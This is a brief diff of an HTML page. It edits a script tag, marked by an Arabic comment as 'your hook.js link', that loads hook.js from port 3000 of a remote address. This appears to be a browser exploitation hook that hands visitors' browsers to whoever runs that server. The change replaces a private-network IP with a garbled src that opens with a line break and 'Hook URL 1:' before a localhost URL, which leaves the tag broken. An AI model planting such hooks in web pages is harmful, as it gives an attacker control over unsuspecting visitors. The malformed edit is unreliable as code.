@@ -28,6 +28,7 @@
   </div>
 
   <!-- رابط hook.js الخاص بك -->
-  <script src="http://172.27.84.215:3000/hook.js"></script>
+  <script src="
+Hook URL 1: http://127.0.0.1:3000/hook.js"></script>
 </body>
 </html>
